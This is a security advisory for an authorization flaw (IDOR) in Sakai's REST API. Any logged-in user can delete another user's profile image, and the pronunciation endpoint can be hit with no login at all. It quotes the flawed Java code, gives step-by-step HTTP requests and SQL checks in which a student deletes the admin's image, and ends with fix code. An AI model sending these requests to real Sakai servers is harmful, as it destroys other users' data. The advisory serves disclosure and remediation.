# [M] Sakai Profile Image Deletion has an IDOR

## Summary
Severity: Medium
Advisory: GHSA-9284-fjc3-fmmj
CVE: CVE-2026-54050
CWE: CWE-639
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-08-24
Source: https://github.com/advisories/GHSA-9284-fjc3-fmmj
Type: github-advisory

## Affected
- Maven: `org.sakaiproject.profile2:profile2-api` — affected >=23.0 <23.5
- Maven: `org.sakaiproject.profile2:profile2-api` — affected >=25.0
- Maven: `org.sakaiproject.profile2:profile2-impl` — affected >=23.0 <23.5
- Maven: `org.sakaiproject.profile2:profile2-impl` — affected >=25.0

## Details
### Summary

The Sakai REST API endpoint `DELETE /api/users/{userId}/profile/image` does not verify that the requesting user is authorized to modify the target user's profile. Any authenticated user can delete the profile image of any other user, including administrators, by supplying a different `userId` in the path. The service layer has no authorization check, and the delete cascades through Content Hosting Service (CHS) with a security advisor that bypasses all CHS permission checks.

### Details
`ProfileController.removeProfileImage()` in the webapi module retrieves the current user's session but performs no comparison between the authenticated user and the target `userId` path parameter:

```java
@DeleteMapping(value = "/users/{userId}/profile/image")
public ResponseEntity<String> removeProfileImage(@PathVariable String userId) {
    String currentUserId = checkSakaiSession().getUserId();
    if (currentUserId == null) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
    }
    profileService.removeProfileImage(userId);  // userId is attacker-controlled
    return ResponseEntity.ok().build();
}
```

`ProfileServiceImpl.removeProfileImage()` delegates directly to `dao.removeProfileImage(userUuid)` with no authorization check. The DAO calls `profileImageUploadedRepository.deleteById(userId)`, removing the `profile_images_t` row unconditionally.

For contrast, the upload endpoint `setProfileImage()` correctly verifies ownership:

```java
if (!sakaiProxy.isSuperUser() && !StringUtils.equals(currentUserUuid, userUuid)) {
    throw new SecurityException("Not allowed to save.");
}
```

This asymmetry means any authenticated user can delete but not upload over another user's profile image.

Additionally, the pronunciation recording delete endpoint (`DELETE /api/users/{userId}/profile/pronunciation`) has no `checkSakaiSession()` call at all, making it accessible without any authentication.


**Setup:**
- Admin user: `admin`, with a custom profile image uploaded
- Attacker: `student2` (unprivileged user, SAKAIID cookie from authenticated session)

**Step 1 - Admin uploads profile image (confirm non-default state):**

```
POST /api/users/admin/profile/image HTTP/1.1
Cookie: SAKAIID=<admin-session>
Content-Type: application/x-www-form-urlencoded

base64=<base64-encoded-png>
```

Response: `{"status":"SUCCESS"}`

**Step 2 - Verify image exists in database:**

```sql
SELECT USER_UUID, RESOURCE_MAIN FROM profile_images_t WHERE USER_UUID='admin';
-- Result: admin | /private/profileImages/admin/1/eb92b129-9b00-4978-aec3-be840455d8e9
```

**Step 3 - Attacker (student2) deletes admin's profile image:**

```
DELETE /api/users/admin/profile/image HTTP/1.1
Host: localhost:9107
Cookie: SAKAIID=974996f4-e9c1-441c-9ab9-d3646aa5c754.9799861f31fb
```

Response: `HTTP/1.1 200`

**Step 4 - Verify image is gone from database:**

```sql
SELECT USER_UUID, RESOURCE_MAIN FROM profile_images_t WHERE USER_UUID='admin';
-- Result: (empty - row deleted)
```

The attack succeeds. Student2's session is accepted by `checkSakaiSession()` (non-blank userId), and the target userId (`admin`) is passed directly to the service without any ownership check.

### Impact

Any authenticated user (student, guest) can:
- Permanently delete the profile image of any other user, including administrators and instructors
- Repeatedly trigger deletion to prevent a target user from maintaining a profile picture
- In a university context where profile photos are used for identity verification in proctored exams or student directories, this could disrupt identity management workflows

The attack is trivially scriptable and can target all users on the platform in bulk.

### Suggested Remediation

In `ProfileController.removeProfileImage()`, add an ownership check before calling the service:

```java
@DeleteMapping(value = "/users/{userId}/profile/image")
public ResponseEntity<String> removeProfileImage(@PathVariable String userId) {
    Session session = checkSakaiSession();
    String currentUserId = session.getUserId();
    if (currentUserId == null) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
    }
    // Add this check:
    if (!sakaiProxy.isSuperUser() && !currentUserId.equals(userId)) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
    }
    profileService.removeProfileImage(userId);
    return ResponseEntity.ok().build();
}
```

Apply the same ownership check in `ProfileServiceImpl.removeProfileImage()` for defense-in-depth, mirroring the pattern in `setProfileImage()`.

For the pronunciation endpoint, add `checkSakaiSession()` and the same ownership check.

### Status / timeline:
- 2026-06-02: Fix committed to master (`a092dbf3dc6bf343131f50007c207a9abd95e852`)
- Release pending.

## References
- https://github.com/sakaiproject/sakai/security/advisories/GHSA-9284-fjc3-fmmj
- https://github.com/sakaiproject/sakai/commit/a092dbf3dc6bf343131f50007c207a9abd95e852
- https://github.com/sakaiproject/sakai
- https://github.com/sakaiproject/sakai/releases/tag/23.5
